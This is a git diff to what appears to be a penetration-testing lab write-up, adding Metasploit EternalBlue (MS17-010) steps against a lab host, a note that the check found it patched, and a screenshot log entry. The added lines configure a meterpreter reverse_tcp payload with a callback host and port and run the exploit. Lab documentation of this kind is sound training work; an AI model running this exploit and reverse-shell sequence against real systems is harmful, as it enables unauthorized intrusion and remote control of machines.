@@ -141,11 +141,16 @@ nmap -Pn -p445 --script smb-vuln-ms17-010 "$RHOST"
 ```text
 # EternalBlue targets SMB — RPORT must be 445, RHOSTS must be 10.20.160.101 (not 10.20.150.x)
 use exploit/windows/smb/ms17_010_eternalblue
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
 set RHOSTS 10.20.160.101
 set RPORT 445
 set LHOST <KALI_LAB_IP>
+set LPORT 4444
 check
+run
 ```
+
+If **`check`** reports **Host does NOT appear vulnerable** / **`STATUS_INVALID_HANDLE`** — the image is likely **MS17-010 patched** or the scanner cannot confirm exploitability. **Do not** rely on **`set ForceExploit true`** unless the lab explicitly allows it (risk of **crash** / unstable box). **Pivot:** **HTTP** (**80** Apache/PHP), **FTP**, **RDP**, **MySQL**, or **credentialed** SMB — see [`101-008`](../Screenshots/101-008_msf_eternalblue_check_not_vulnerable_tm6_afrocha.png) + [`unfruitful_attempts`](unfruitful_attempts/README.md).
 
 **HTTP on 80/443 (parallel lane):**
 
@@ -173,6 +178,7 @@ nmap -Pn -p3389,21 -sV -sC "$RHOST"
 | **101-005** | [`101-005_enum4linux_groups_rid_fail_tm6_afrocha.png`](../Screenshots/101-005_enum4linux_groups_rid_fail_tm6_afrocha.png) | Groups / RID / printers → **denied** |
 | **101-006** | [`101-006_msf_eternalblue_wrong_rhost_rport_tm6_afrocha.png`](../Screenshots/101-006_msf_eternalblue_wrong_rhost_rport_tm6_afrocha.png) | MSF EternalBlue — **wrong IP octet** + **`RPORT 80`** (use **`.160.101`** + **`445`**) — see [`unfruitful_attempts`](unfruitful_attempts/README.md) |
 | **101-007** | [`101-007_msf_eternalblue_rport80_ipc_error_tm6_afrocha.png`](../Screenshots/101-007_msf_eternalblue_rport80_ipc_error_tm6_afrocha.png) | Same issue: **`RPORT 80`** → SMB **`IPC$`** error + **`not-vulnerable`** — **`set RPORT 445`** |
+| **101-008** | [`101-008_msf_eternalblue_check_not_vulnerable_tm6_afrocha.png`](../Screenshots/101-008_msf_eternalblue_check_not_vulnerable_tm6_afrocha.png) | **`RPORT 445`** OK — **`check`** still **not vulnerable** / **`run`** aborts — treat host as **patched**; pivot off SMB exploit |
 
 ---
 
